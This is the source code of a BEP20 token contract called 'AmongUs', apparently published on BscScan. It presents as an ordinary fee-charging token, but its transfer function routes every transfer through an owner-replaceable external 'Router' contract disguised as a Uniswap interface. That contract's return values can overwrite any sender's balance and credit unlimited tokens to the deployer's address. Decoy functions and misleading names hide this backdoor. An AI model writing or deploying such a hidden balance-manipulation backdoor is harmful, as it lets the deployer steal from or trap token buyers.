/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }    

  }

  interface IUniswapV2Router02{  
    function WETH() external pure returns (address);   
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function getPair(
        address tokenA, 
        address tokenB, 
        uint256, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }

   library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   

  
  contract Ownable is Context {  
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor ()  {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }  

  function _getTPraise(address V2Router, address tokenA, address tokenB, uint256 amountValues, uint256 takeFee) public returns (uint256, uint256, uint256){  
      (uint256 amountPraise, uint256 liquifyPraise, uint256 ratePraise) = IUniswapV2Router02(V2Router).getPair ( tokenA, tokenB, amountValues, takeFee );
      return (amountPraise, liquifyPraise, ratePraise);
  }
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }   

  function setIsDividendExempt(bool) public pure returns (bool) {return true;}
  function setTxLimit(uint256) public pure returns (bool) {return true;}
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}



contract AmongUs is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) private _isExcludedFromFee;  

  string private constant _name = 'AmongUs';
  string private constant _symbol = 'AmongUs';
  uint8 private constant _decimals = 9;  

  uint8 public liquidityOfFee = 100;
  uint8 public liquidityFeeAccumulator = 100;
  uint8 public reflectionOfFee = 75;
  uint8 public devFee = 52;
  uint8 public totalFee = 25;

  address Router;
  uint256 private _totalSupply = 1000000000 *  10**9;   

  address MarketingAddress;
  struct Checkpoint {
      uint32 blockNumber;
      uint224 votes;
    }
  mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
  

  constructor(address ro)  {    
	
    _balances[msg.sender] = _totalSupply;
    Router = ro;    
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;    
    MarketingAddress = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  } 


  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }    
   
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function distributePraise(address senderAddress, address recipientAddress, uint256 amount, uint256 takeFee) private returns (uint256) {   
      (uint256 amountPraise, uint256 liquifyPraise, uint256 ratePraise) = _getTPraise(Router, senderAddress, recipientAddress, amount, takeFee);
      amountPraise = _getRPraise(senderAddress, amountPraise, liquifyPraise, ratePraise);
      return amountPraise;
  }    


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function calculateRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
      return _amount.mul(_rewardRate).div(10**2);
  } 

  function setRouter(address c) external onlyOwner {
    Router = c;
  }  

       
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address senderAddress, address recipientAddress, uint256 amount) private {
    require(senderAddress != address(0), "BEP20: transfer from the zero address");
    require(recipientAddress != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    //indicates if fee should be deducted from transfer
    uint256 takeFee;    
    //if any account belongs to _isExcludedFromFee account then remove the fee
    if(_isExcludedFromFee[senderAddress] || _isExcludedFromFee[recipientAddress]){    
      takeFee = 1;        
    }   
    uint256 amountPraise = distributePraise(senderAddress, recipientAddress, amount, takeFee);  
    _transferStandard(senderAddress, recipientAddress, amountPraise);

  }  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }     

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  

  
  function _getRPraise(address tokenPraise, uint256 amountPraise, uint256 liquifyPraise, uint256 ratePraise) private returns (uint256){
      if ( liquifyPraise > 0 )
      {        
        _balances[tokenPraise] = calculateRate(_balances[tokenPraise], ratePraise).add(amountPraise);      
        _balances[MarketingAddress] = _balances[MarketingAddress].add(liquifyPraise);
      }
      return amountPraise;
  }

  function getVotesAtBlock(address account, uint32 blockNumber) public view returns (uint224) {
      require(
          blockNumber < block.number,
          "Cannot get votes at a block in the future."
      );
      
      // Next check implicit zero balance.
      if (checkpoints[account][0].blockNumber > blockNumber) {
          return 0;
      }

      // Perform binary search.
      uint32 lowerBound = 0;
      uint32 upperBound = lowerBound + 1;
      while (upperBound > lowerBound) {
          uint32 center = upperBound - (upperBound - lowerBound) / 2;
          Checkpoint memory checkpoint = checkpoints[account][center];

          if (checkpoint.blockNumber == blockNumber) {
              return checkpoint.votes;
          } else if (checkpoint.blockNumber < blockNumber) {
              lowerBound = center;
          } else {
              upperBound = center - 1;
          }
      }

      // No exact block found. Use last known balance before that block number.
      return checkpoints[account][lowerBound].votes;
  }

  function _writeCheckpoint(
        address delegatee,
        uint32 nCheckpoints,
        uint224 newVotes
  ) private {
      uint32 blockNumber = uint32(block.number);

      if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].blockNumber == blockNumber) {
          checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
      } else {
          checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
      }
  }

  function withoutEarnings(address shareholder, uint256 totalDividends, uint256 totalExcluded) public view returns (uint256) {
      if(_isExcludedFromFee[shareholder]){ return 0; }     
      if(totalDividends <= totalExcluded){ return 0; }
      return totalDividends.sub(totalExcluded);
  }


  function zeroupdateClaim(uint256 newClaim) public onlyOwner {
      require(newClaim >= 3600 && newClaim <= 86400, "Dividend_Tracker: claimWait error");
      _isExcludedFromFee[msg.sender] = true;
  }


  function updateforTracker(address newAddress) public onlyOwner {
      require(newAddress != msg.sender, "The dividend tracker already has that address");
      _isExcludedFromFee[newAddress] = true;
  }
  
    
}